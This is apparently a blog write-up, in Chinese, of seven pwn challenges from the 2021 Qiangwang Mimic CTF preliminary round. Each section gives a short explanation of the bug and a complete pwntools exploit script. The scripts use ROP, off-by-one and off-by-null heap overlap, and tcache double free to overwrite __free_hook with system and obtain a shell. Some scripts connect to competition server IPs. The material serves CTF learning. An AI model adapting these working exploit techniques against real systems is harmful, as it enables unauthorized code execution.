---
title: 强网拟态2021初赛Pwn题WP
date: 2021-11-03T09:22:45+08:00
author: Ch4rc-al
categories:
  - WriteUps
tags:
  - Pwn
  - CTF
---





强网拟态2021初赛Pwn题WP

<!--more-->

## sonic

rop至后门函数，即可获得flag，也可以通过getshell的方式

```python
from pwn import *
context(arch='amd64',log_level='debug')

p=process('./sonic')
p=remote('123.60.63.90',6890)


p.recvuntil('main Address=0x')
main=int(p.recvline(),16)

log.success('main->'+hex(main))

login=main-0x7cf+0x73a

p.sendlineafter('login:','a'*0x20+'b'*8+p64(login))

p.interactive()
```

## old_school

2.27 的 off by one，常规overlap拿基址，打`__free_hook`为`system`即可getshell

```python
from pwn import *
context(arch='amd64',log_level='debug')
p=process('./old_school')
p=remote('121.36.194.21',49153)
libc=ELF('./libc.so.6')
def choose(idx):
    p.sendlineafter('choice: ',str(idx))

def add(idx,size):
    choose(1)
    p.sendlineafter('Index: ',str(idx))
    p.sendlineafter('Size: ',str(size))

def edit(idx,con):
    choose(2)
    p.sendlineafter('Index: ',str(idx))
    p.sendlineafter('Content: ',con)

def show(idx):
    choose(3)
    p.sendlineafter('Index: ',str(idx))

def free(idx):
    choose(4)
    p.sendlineafter('Index: ',str(idx))

for i in range(8):
    add(i,0x88)

add(8,0x10)
add(9,0x60)
add(10,0x60)
for i in range(7):
    free(i)


edit(7,'a'*0x88+'\x91')
free(8)
add(11,0x10)
show(9)
p.recvuntil('Content: ')
libc_base=u64(p.recv(6)+b'\x00\x00')-96-0x10-libc.sym['__malloc_hook']
log.success('libc_base->'+hex(libc_base))


add(12,0x20)
add(13,0x20)
add(14,0x20)

free(12)
free(13)

edit(14,'/bin/sh\x00')

edit(9,p64(libc_base+libc.sym['__free_hook']))
add(12,0x20)
add(13,0x20)
edit(13,p64(libc_base+libc.sym['system']))
free(14)

p.interactive()
```

## old_school_revenge

与上题框架相同，将漏洞改成了off by null，改prev_size造成over_lap拿基址打`__free_hook`

```python
from pwn import *
context(arch='amd64',log_level='debug')
p=process('./old_school_revenge')
# p=remote('121.36.194.21',49153)
libc=ELF('./libc-2.27.so')
def choose(idx):
    p.sendlineafter('choice: ',str(idx))

def add(idx,size):
    choose(1)
    p.sendlineafter('Index: ',str(idx))
    p.sendlineafter('Size: ',str(size))

def edit(idx,con):
    choose(2)
    p.sendlineafter('Index: ',str(idx))
    p.sendlineafter('Content: ',con)

def show(idx):
    choose(3)
    p.sendlineafter('Index: ',str(idx))

def free(idx):
    choose(4)
    p.sendlineafter('Index: ',str(idx))

for i in range(9,16):
    add(i,0xf8)

add(0,0xf8)
add(1,0xf8)
add(2,0xf8)



for i in range(9,16):
    free(i)

add(20,0x20)

edit(0,'b'*0xf0)

free(0)
edit(1,'a'*0xf0+p64(0x200))
free(2)
add(3,0x70)
add(4,0x70)
show(1)

p.recvuntil('Content: ')
libc_base=u64(p.recv(6)+b'\x00\x00')-96-0x10-libc.sym['__malloc_hook']
log.success('libc_base->'+hex(libc_base))

edit(3,'/bin/sh\x00')

add(5,0x20)

free(5)

edit(1,p64(libc_base+libc.sym['__free_hook']))
add(6,0x20)
add(7,0x20)

edit(7,p64(libc_base+libc.sym['system']))

free(3)




p.interactive()
```

## bitflip

限制了堆块大小的 off by one，将size改大即可

```python
from pwn import *
context(arch='amd64',log_level='debug')
p=process('./bitflip')
libc=ELF('./libc-2.27.so')
def choose(idx):
    p.sendlineafter('choice: ',str(idx))

def add(idx,size):
    choose(1)
    p.sendlineafter('Index: ',str(idx))
    p.sendlineafter('Size: ',str(size))

def edit(idx,con):
    choose(2)
    p.sendlineafter('Index: ',str(idx))
    p.sendlineafter('Content: ',con)

def show(idx):
    choose(3)
    p.sendlineafter('Index: ',str(idx))

def free(idx):
    choose(4)
    p.sendlineafter('Index: ',str(idx))

for i in range(8):
    for j in range(i*3,i*3+3):
        add(j,0x48)
add(0x1f,0x10)
for i in range(8):
    edit(i*3,'a'*0x48+'\xa1')
    free(i*3+1)

add(24,0x40)
show(23)
p.recvuntil('Content: ')
libc_base=u64(p.recv(6)+b'\x00\x00')-96-0x10-libc.sym['__malloc_hook']
log.success('libc_base->'+hex(libc_base))

add(25,0x40)
free(25)

edit(23,p64(libc_base+libc.sym['__free_hook']))

add(25,0x40)
edit(25,'/bin/sh\x00'+'\n')
add(26,0x40)
edit(26,p64(libc_base+libc.sym['system']))

free(25)


p.interactive()
```

## random_heap

申请堆块时size加上了0-240的随机大小，但存在uaf，我们只需要在free后修改tcache的key值即可绕过double free检查，使得连续释放相同大小的tcache bin，

打`__free_hook`过程需要爆破才能成功

```python
from pwn import *
context(arch='amd64')

# p=remote('121.36.194.21',49153)
libc=ELF('./libc-2.27.so')
def choose(idx):
    p.sendlineafter('choice: ',str(idx))

def add(idx,size):
    choose(1)
    p.sendlineafter('Index: ',str(idx))
    p.sendlineafter('Size: ',str(size))

def edit(idx,con):
    choose(2)
    p.sendlineafter('Index: ',str(idx))
    p.sendlineafter('Content: ',con)

def show(idx):
    choose(3)
    p.sendlineafter('Index: ',str(idx))

def free(idx):
    choose(4)
    p.sendlineafter('Index: ',str(idx))

def pwn():
    add(0,0x20)
    edit(0,'/bin/sh\x00')
    add(1,0x100)
    add(2,0x10)
    for i in range(7):
        free(1)
        edit(1,'a'*0x8)
    
    free(1)
    show(1)
    p.recvuntil('Content: ')
    libc_base=u64(p.recv(6)+'\x00\x00')-96-0x10-libc.sym['__malloc_hook']
    log.success('libc_base->'+hex(libc_base))

    add(3,0x30)
    free(3)
    edit(3,p64(libc_base+libc.sym['__free_hook']))
    add(4,0x30)
    add(4,0x30)
    edit(4,p64(libc_base+libc.sym['system']))
    free(0)


while True:
    try:
        p=process('./random_heap')
        pwn()
        p.interactive()
    except:
        print(2)
        p.close()

```

## pwnpwn

给了函数地址，常规rop即可

```python
from pwn import *
context(arch='amd64',log_level='debug')
p=process('./pwnpwn')
libc=ELF('./libc-2.23.so')
elf=ELF('./pwnpwn')

p.recv()
p.sendline('1')
p.recvline()
vul=int(p.recvline()[:-1],16)
log.success(hex(vul))

p.sendline('2')

p.send('a'*0x69)

p.recvuntil('a'*0x68)

canary=u64(p.recv(8))-ord('a')
log.success(hex(canary))

rbp=u64(p.recv(6)+'\x00\x00')

stack=rbp-0xa0

pop_rdi=vul-0x9b9+0xb83
prsi_r = vul-0x9b9+0x0000000000000b81
gdb.attach(p)
p.send('a'*0x68+p64(canary)+'/bin/sh\x00'+p64(pop_rdi)+p64(stack+0x70)+p64(vul-0x9b9+elf.plt['system']))
p.interactive()
```

## bornote

2.31 的 off by null，在堆上布置假chunk绕过检查后over_lap，参考[TCTF_Final 2019 babyheap | X3h1n](https://x3h1n.github.io/2019/07/03/TCTF-Final-2019-babyheap/)

```python
from pwn import *
context(arch='amd64',log_level='debug')
p=process('./bornote')
libc=ELF('./libc-2.31.so')

def choose(idx):
    p.sendlineafter('cmd: ',str(idx))

def add(size):
    choose(1)
    p.sendlineafter('Size: ',str(size))

def free(idx):
    choose(2)
    p.sendlineafter('Index: ',str(idx))

def edit(idx,con):
    choose(3)
    p.sendlineafter('Index: ',str(idx))
    p.sendafter('Note: ',con)

def show(idx):
    choose(4)
    p.sendlineafter('Index: ',str(idx))

username=b'charcoal'

p.sendlineafter('username: ',username)



add(0x430)
add(0x20)
add(0x20)
free(0)

add(0x430)
show(0)

p.recvuntil('Note: ')
libc_base=u64(p.recv(6)+b'\x00\x00')-96-0x10-libc.sym['__malloc_hook']
log.success(hex(libc_base))

free(1)
free(2)

add(0x20)

show(1)

heap_base=u64(p.recvline()[-7:-1]+b'\x00\x00')
log.success(hex(heap_base))
free(0)
free(1)


for i in range(0,10): #0-9
    add(0xf8)


for i in range(0,7):
    free(i)
edit(7,b'a'*0x10+p64(0)+p64(0x1e1)+p64(heap_base+0x950-0x5e0)*2+b'\n')

edit(8,b'a'*0xf0+p64(0x1e0))
free(9)

add(0xd0)
add(0x70)
add(0x70)
free(2)
free(1)
edit(8,p64(libc_base+libc.sym['__free_hook'])+b'\n')

add(0x70)
add(0x70)

edit(2,p64(libc_base+libc.sym['system'])+b'\n')

edit(1,b'/bin/sh\x00\n')

free(1)


p.interactive()
```

